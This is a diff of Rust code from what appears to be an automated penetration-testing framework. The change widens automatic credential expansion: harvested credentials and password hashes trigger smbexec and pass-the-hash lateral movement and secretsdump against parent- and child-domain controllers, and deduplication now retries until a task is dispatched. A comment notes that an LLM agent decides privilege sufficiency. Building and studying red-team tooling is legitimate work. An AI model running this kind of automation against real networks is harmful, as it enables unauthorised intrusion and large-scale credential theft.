@@ -69,17 +69,24 @@ pub async fn auto_credential_expansion(
                         return None;
                     }
 
-                    // Also find DCs for this credential's domain (for secretsdump)
-                    let dc_ip = state
+                    // Find DCs for this credential's domain (for secretsdump).
+                    // Also include child-domain DCs — parent creds are valid in child domains.
+                    let cred_domain = cred.domain.to_lowercase();
+                    let dc_ips: Vec<String> = state
                         .domain_controllers
-                        .get(&cred.domain.to_lowercase())
-                        .cloned();
+                        .iter()
+                        .filter(|(domain, _)| {
+                            let d = domain.to_lowercase();
+                            d == cred_domain || d.ends_with(&format!(".{cred_domain}"))
+                        })
+                        .map(|(_, ip)| ip.clone())
+                        .collect();
 
                     Some(ExpansionWork {
                         dedup_key: dedup,
                         credential: cred.clone(),
                         targets,
-                        dc_ip,
+                        dc_ips,
                         is_admin: cred.is_admin,
                     })
                 })
@@ -88,6 +95,8 @@ pub async fn auto_credential_expansion(
         };
 
         for item in work {
+            let mut any_dispatched = false;
+
             // 1. Try lateral movement on non-DC hosts (up to 5 targets)
             let technique = LATERAL_TECHNIQUES[0]; // Start with smbexec
             for target_ip in item.targets.iter().take(5) {
@@ -95,6 +104,7 @@ pub async fn auto_credential_expansion(
                     .request_lateral(target_ip, &item.credential, technique)
                     .await
                 {
+                    any_dispatched = true;
                     debug!(
                         task_id = %task_id,
                         target = %target_ip,
@@ -105,11 +115,10 @@ pub async fn auto_credential_expansion(
                 }
             }
 
-            // 2. Try secretsdump on DC for ALL credentials (not just admin).
-            // Secretsdump requires admin rights but we dispatch speculatively —
-            // the LLM agent will determine if the credential has sufficient privileges.
-            // Admin creds get higher priority (2 vs 5).
-            if let Some(ref dc_ip) = item.dc_ip {
+            // 2. Try secretsdump on DCs for ALL credentials (not just admin).
+            // Includes child-domain DCs since parent creds are valid there.
+            // Admin creds get higher priority (2 vs 7).
+            for dc_ip in &item.dc_ips {
                 let sd_dedup = format!(
                     "{}:{}:{}",
                     dc_ip,
@@ -122,11 +131,12 @@ pub async fn auto_credential_expansion(
                 };
 
                 if !already_dumped {
-                    let priority = if item.is_admin { 2 } else { 5 };
+                    let priority = if item.is_admin { 2 } else { 7 };
                     if let Ok(Some(task_id)) = dispatcher
                         .request_secretsdump(dc_ip, &item.credential, priority)
                         .await
                     {
+                        any_dispatched = true;
                         debug!(
                             task_id = %task_id,
                             dc = %dc_ip,
@@ -147,17 +157,19 @@ pub async fn auto_credential_expansion(
                 }
             }
 
-            // Always mark as processed — even if throttled/deferred — to prevent
-            // the credential from being retried every 15s and flooding the deferred queue.
-            dispatcher
-                .state
-                .write()
-                .await
-                .mark_processed(DEDUP_EXPANSION_CREDS, item.dedup_key.clone());
-            let _ = dispatcher
-                .state
-                .persist_dedup(&dispatcher.queue, DEDUP_EXPANSION_CREDS, &item.dedup_key)
-                .await;
+            // Only mark as processed if at least one task was actually dispatched.
+            // If all tasks were throttled/deferred, retry next cycle.
+            if any_dispatched {
+                dispatcher
+                    .state
+                    .write()
+                    .await
+                    .mark_processed(DEDUP_EXPANSION_CREDS, item.dedup_key.clone());
+                let _ = dispatcher
+                    .state
+                    .persist_dedup(&dispatcher.queue, DEDUP_EXPANSION_CREDS, &item.dedup_key)
+                    .await;
+            }
         }
 
         // 3. Try hashes for pass-the-hash lateral movement
@@ -210,6 +222,8 @@ pub async fn auto_credential_expansion(
         };
 
         for item in hash_work {
+            let mut any_dispatched = false;
+
             // Build a credential-like object for pass-the-hash
             let pth_cred = ares_core::models::Credential {
                 id: format!("pth_{}", item.hash.username),
@@ -228,6 +242,7 @@ pub async fn auto_credential_expansion(
                     .request_lateral(target_ip, &pth_cred, "pth_smbclient")
                     .await
                 {
+                    any_dispatched = true;
                     debug!(
                         task_id = %task_id,
                         target = %target_ip,
@@ -259,6 +274,7 @@ pub async fn auto_credential_expansion(
                         if let Ok(Some(task_id)) =
                             dispatcher.request_secretsdump(&dc_ip, &pth_cred, 2).await
                         {
+                            any_dispatched = true;
                             debug!(
                                 task_id = %task_id,
                                 dc = %dc_ip,
@@ -279,16 +295,18 @@ pub async fn auto_credential_expansion(
                 }
             }
 
-            // Always mark as processed to prevent retry storms.
-            dispatcher
-                .state
-                .write()
-                .await
-                .mark_processed(DEDUP_HASH_LATERAL, item.dedup_key.clone());
-            let _ = dispatcher
-                .state
-                .persist_dedup(&dispatcher.queue, DEDUP_HASH_LATERAL, &item.dedup_key)
-                .await;
+            // Only mark as processed if at least one task was dispatched.
+            if any_dispatched {
+                dispatcher
+                    .state
+                    .write()
+                    .await
+                    .mark_processed(DEDUP_HASH_LATERAL, item.dedup_key.clone());
+                let _ = dispatcher
+                    .state
+                    .persist_dedup(&dispatcher.queue, DEDUP_HASH_LATERAL, &item.dedup_key)
+                    .await;
+            }
         }
     }
 }
@@ -297,7 +315,7 @@ struct ExpansionWork {
     dedup_key: String,
     credential: ares_core::models::Credential,
     targets: Vec<String>,
-    dc_ip: Option<String>,
+    dc_ips: Vec<String>,
     is_admin: bool,
 }
 
